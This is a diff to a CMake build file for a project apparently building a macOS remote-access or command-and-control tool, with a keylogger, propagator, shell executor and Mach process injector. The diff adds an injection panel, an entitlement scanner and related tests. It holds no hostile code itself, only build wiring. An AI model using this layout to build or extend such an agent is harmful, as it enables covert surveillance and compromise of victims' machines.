@@ -52,6 +52,7 @@ add_executable(inferno_server
     server/src/ui/components/TelemetryPanel.cpp
     server/src/ui/components/KeylogPanel.cpp
     server/src/ui/components/IntelligencePanel.cpp
+    server/src/ui/components/InjectionPanel.cpp
     server/src/ui/components/PropagationPanel.cpp
     server/src/database/Inferno_Database.cpp
     server/src/services/Analysis.cpp
@@ -65,6 +66,7 @@ add_executable(inferno_server
     server/include/ui/components/TelemetryPanel.hpp
     server/include/ui/components/KeylogPanel.hpp
     server/include/ui/components/IntelligencePanel.hpp
+    server/include/ui/components/InjectionPanel.hpp
     server/include/ui/components/PropagationPanel.hpp
     server/include/database/Inferno_Database.hpp
     server/include/services/Analysis.hpp
@@ -116,6 +118,7 @@ if(APPLE)
         client/src/ShellExecutor.cpp
         client/src/KeyLogger.cpp
         client/src/Propagator.cpp
+        client/src/EntitlementScanner.cpp
     )
     target_include_directories(inferno_agent_dylib PRIVATE client/include)
     target_compile_definitions(inferno_agent_dylib PRIVATE INFERNO_DYLIB)
@@ -145,6 +148,7 @@ add_executable(inferno_tests
     tests/database_test.cpp
     tests/analysis_test.cpp
     tests/process_profiler_test.cpp
+    tests/scanner_test.cpp
     server/src/network/server.cpp
     server/src/database/Inferno_Database.cpp
     server/src/services/Analysis.cpp
@@ -164,7 +168,10 @@ if(APPLE)
     target_link_libraries(inferno_tests PRIVATE ${CORE_GRAPHICS} ${CARBON} ${IO_KIT} ${CORE_FOUNDATION})
     target_sources(inferno_tests PRIVATE
         tests/injector_test.cpp
+        tests/scanner_test.cpp
         client/src/entry_dylib.cpp
+        client/src/EntitlementScanner.cpp
+        client/src/MachInjector.cpp
     )
     target_compile_definitions(inferno_tests PRIVATE
         TEST_BINARY_DIR="${CMAKE_CURRENT_BINARY_DIR}"
